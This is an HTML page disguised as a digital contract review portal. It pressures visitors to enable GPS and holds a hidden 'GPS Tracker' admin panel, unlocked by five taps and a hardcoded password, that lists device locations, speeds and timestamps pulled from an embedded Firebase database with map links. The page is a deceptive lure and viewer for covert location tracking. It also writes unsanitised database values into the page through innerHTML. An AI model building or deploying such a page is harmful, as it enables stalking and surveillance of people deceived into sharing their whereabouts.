<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Digital Contract Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background-color: #f5f5f5;
      color: #333;
    }

    header {
      background: #20262E;
      color: white;
      padding: 15px;
      text-align: center;
      font-size: 1.3em;
    }

    .container {
      padding: 20px;
      max-width: 600px;
      margin: auto;
    }

    .contract-box {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }

    h2 {
      margin-top: 0;
      color: #444;
    }

    p {
      line-height: 1.6;
    }

    .admin-panel {
      display: none;
      margin-top: 20px;
      background: #ffffff;
      border: 1px solid #ccc;
      padding: 15px;
      border-radius: 8px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
    }

    th, td {
      border: 1px solid #ccc;
      padding: 8px;
      font-size: 0.9em;
    }

    th {
      background-color: #f0f0f0;
    }

    .map-link {
      color: #007BFF;
      text-decoration: none;
      font-weight: bold;
    }

    .map-link:hover {
      text-decoration: underline;
    }

    .hidden {
      display: none;
    }

    #location-alert {
      padding: 10px;
      background: #ffe3e3;
      color: #9b1c1c;
      border: 1px solid #ffaaaa;
      margin-bottom: 15px;
      border-radius: 5px;
      display: none;
    }

    input[type="password"] {
      padding: 8px;
      width: 100%;
      margin-top: 10px;
      margin-bottom: 10px;
    }

    button {
      padding: 8px 15px;
      background: #333;
      color: white;
      border: none;
      border-radius: 5px;
    }

    footer {
      text-align: center;
      font-size: 0.8em;
      color: #888;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <header>
    Secure Document Contract Portal
  </header>

  <div class="container">
    <div id="location-alert">Location access is required for this page. Please enable GPS to view contract.</div>

    <div class="contract-box" id="viewer-content">
      <h2>Contract A125 - Pending Review</h2>
      <p>This document contains sensitive digital contract information. Please ensure proper confidentiality and legal obligations before proceeding.</p>
      <p>Download copy of the contract for formal review. Ensure all parties have digitally signed before next stage.</p>
    </div>

    <div class="admin-panel" id="adminPanel">
      <h3>Admin Panel (GPS Tracker)</h3>
      <table id="dataTable">
        <thead>
          <tr>
            <th>Device ID</th>
            <th>Latitude</th>
            <th>Longitude</th>
            <th>Speed</th>
            <th>Direction</th>
            <th>Timestamp</th>
            <th>Map</th>
          </tr>
        </thead>
        <tbody id="logTable"></tbody>
      </table>
    </div>
  </div>

  <footer>
    &copy; 2025 - Digital Contract Management System
  </footer>

  <script>
    // Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };

    // Admin Unlock
    let tapCount = 0;
    document.body.addEventListener("click", () => {
      tapCount++;
      if (tapCount === 5) {
        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
        setTimeout(() => {
          const pwd = prompt("Enter Admin Password:");
          if (pwd === "ASCII") {
            document.getElementById("adminPanel").style.display = "block";
          }
        }, 800);
      }
    });

    // Check Location Permission
    if (!navigator.geolocation) {
      document.getElementById("location-alert").style.display = "block";
    } else {
      navigator.geolocation.getCurrentPosition(() => {}, () => {
        document.getElementById("location-alert").style.display = "block";
      });
    }

    // Firebase Init
    if (typeof firebase === "undefined") {
      const script = document.createElement("script");
      script.src = "https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js";
      script.onload = () => {
        const dbScript = document.createElement("script");
        dbScript.src = "https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js";
        dbScript.onload = () => {
          firebase.initializeApp(firebaseConfig);
          const db = firebase.database().ref("location");
          db.on("value", (snapshot) => {
            const logs = snapshot.val();
            const logTable = document.getElementById("logTable");
            logTable.innerHTML = "";
            for (let id in logs) {
              const entry = logs[id];
              const tr = document.createElement("tr");
              tr.innerHTML = `
                <td>${id}</td>
                <td>${entry.lat}</td>
                <td>${entry.lng}</td>
                <td>${entry.speed || "N/A"}</td>
                <td>${entry.direction || "N/A"}</td>
                <td>${entry.timestamp}</td>
                <td><a href="https://maps.google.com/?q=${entry.lat},${entry.lng}" target="_blank" class="map-link">Open</a></td>
              `;
              logTable.appendChild(tr);
            }
          });
        };
        document.head.appendChild(dbScript);
      };
      document.head.appendChild(script);
    }
  </script>
</body>
      </html>
